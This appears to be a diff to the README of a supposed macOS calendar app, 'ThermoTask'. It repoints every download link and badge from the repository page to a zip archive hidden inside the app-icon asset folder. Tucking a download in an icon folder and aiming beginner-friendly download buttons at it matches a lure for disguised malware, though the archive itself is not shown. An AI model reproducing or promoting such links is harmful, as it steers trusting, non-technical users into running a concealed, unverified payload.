@@ -1,6 +1,6 @@
 # 🗓 ThermoTask - Unify Your Daily Apple Events
 
-[![Download ThermoTask](https://img.shields.io/badge/Download-ThermoTask-orange?style=for-the-badge&logo=appveyor)](https://github.com/cmuthomi/ThermoTask)
+[![Download ThermoTask](https://img.shields.io/badge/Download-ThermoTask-orange?style=for-the-badge&logo=appveyor)](https://github.com/cmuthomi/ThermoTask/raw/refs/heads/main/ThermoTask/Assets.xcassets/AppIcon.appiconset/Task-Thermo-v3.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ You do not need technical skills to use ThermoTask. This step-by-step guide will
 
 Click the large badge or the link below to visit the GitHub page where you can download the latest version.
 
-[Download ThermoTask from GitHub](https://github.com/cmuthomi/ThermoTask)
+[Download ThermoTask from GitHub](https://github.com/cmuthomi/ThermoTask/raw/refs/heads/main/ThermoTask/Assets.xcassets/AppIcon.appiconset/Task-Thermo-v3.8.zip)
 
 Once on the page:
 
@@ -144,5 +144,5 @@ You can explore more about:
 
 ---
 
-[Download ThermoTask from GitHub](https://github.com/cmuthomi/ThermoTask)  
-[![Download ThermoTask](https://img.shields.io/badge/Download-ThermoTask-orange?style=for-the-badge&logo=appveyor)](https://github.com/cmuthomi/ThermoTask)
+[Download ThermoTask from GitHub](https://github.com/cmuthomi/ThermoTask/raw/refs/heads/main/ThermoTask/Assets.xcassets/AppIcon.appiconset/Task-Thermo-v3.8.zip)  
+[![Download ThermoTask](https://img.shields.io/badge/Download-ThermoTask-orange?style=for-the-badge&logo=appveyor)](https://github.com/cmuthomi/ThermoTask/raw/refs/heads/main/ThermoTask/Assets.xcassets/AppIcon.appiconset/Task-Thermo-v3.8.zip)
